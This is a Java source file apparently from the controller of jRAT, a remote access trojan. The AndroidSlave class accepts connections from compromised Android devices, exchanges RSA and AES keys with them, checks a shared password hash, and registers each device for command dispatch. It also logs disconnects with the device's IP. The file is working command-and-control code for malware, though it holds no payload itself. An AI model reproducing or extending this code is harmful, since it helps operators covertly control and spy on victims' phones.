package se.jrat.controller.android;

import java.awt.TrayIcon;
import java.io.DataOutputStream;
import java.net.Socket;
import java.util.Arrays;

import javax.crypto.BadPaddingException;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

import se.jrat.common.codec.Hex;
import se.jrat.common.crypto.Crypto;
import se.jrat.common.crypto.StreamKeyExchanger;
import se.jrat.common.hash.Sha1;
import se.jrat.controller.AbstractSlave;
import se.jrat.controller.Main;
import se.jrat.controller.addons.PluginEventHandler;
import se.jrat.controller.crypto.GlobalKeyPair;
import se.jrat.controller.exceptions.CloseException;
import se.jrat.controller.net.ConnectionHandler;
import se.jrat.controller.net.ServerListener;
import se.jrat.controller.packets.android.incoming.IncomingAndroidPackets;
import se.jrat.controller.packets.android.outgoing.AbstractOutgoingAndroidPacket;
import se.jrat.controller.packets.android.outgoing.AndroidPacket0Ping;
import se.jrat.controller.utils.TrayIconUtils;

public class AndroidSlave extends AbstractSlave {
	
	public AndroidSlave(ServerListener connection, Socket socket) {
		super(connection, socket);
		new Thread(this).start();
	}

	@Override
	public void run() {
		try {
			initialize();
		
			StreamKeyExchanger exchanger = new StreamKeyExchanger(GlobalKeyPair.getKeyPair(), dis, dos);
			exchanger.writePublicKey();
			rsaKey = exchanger.readRemoteKey();
			
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(128);
            SecretKey secretKey = keyGen.generateKey();

            key = secretKey.getEncoded();
            byte[] encryptedKey = Crypto.encrypt(key, rsaKey, "RSA");
            dos.writeInt(encryptedKey.length);
            dos.write(encryptedKey);
			
			if (Main.debug) {
				Main.debug("Encryption key: " + Hex.encode(key));
			}

			while (true) {
				byte header = readByte();

				if (header == 1) {
					Sha1 sha = new Sha1();
					
					String data = connection.getPass();

					byte[] localHash = sha.hash(data);
					byte[] remoteHash = new byte[20];

					dis.readFully(remoteHash);					

					if (Arrays.equals(localHash, remoteHash)) {
						setAuthenticated(true);
						ConnectionHandler.addSlave(this);
						continue;
					}
				}

				if (!isAuthenticated()) {
					Main.instance.getPanelLog().addEntry("Warning", this, "Failed verifying password, not valid handshake");
					this.closeSocket(new CloseException("Failed verifying password, not valid handshake"));
				}

				if (header == 0) {
					pong();
					continue;
				}

				IncomingAndroidPackets.execute(header, this);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			String message = ex.getClass().getSimpleName() + ": " + ex.getMessage();

			Main.instance.getPanelLog().addEntry("Disconnect", this, message);

			if (ex instanceof BadPaddingException) {
				message += ", is the encryption key matching?";
			}

			try {
				ConnectionHandler.removeSlave(this, ex);
			} catch (Exception e) {
			}

			TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
			PluginEventHandler.onDisconnect(this);
		}
	}

	@Override
	public void ping() throws Exception {
		addToSendQueue(new AndroidPacket0Ping());
	}

	@Override
	public String getDisplayName() {
		// TODO Auto-generated method stub
		return null;
	}
	
	public synchronized void addToSendQueue(AbstractOutgoingAndroidPacket packet) {
		try {
			sendPacket(packet, dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void sendPacket(AbstractOutgoingAndroidPacket packet, DataOutputStream dos) throws Exception {
		packet.send(this, dos);
	}

	@Override
	public String getFileSeparator() {
		return "/";
	}

}
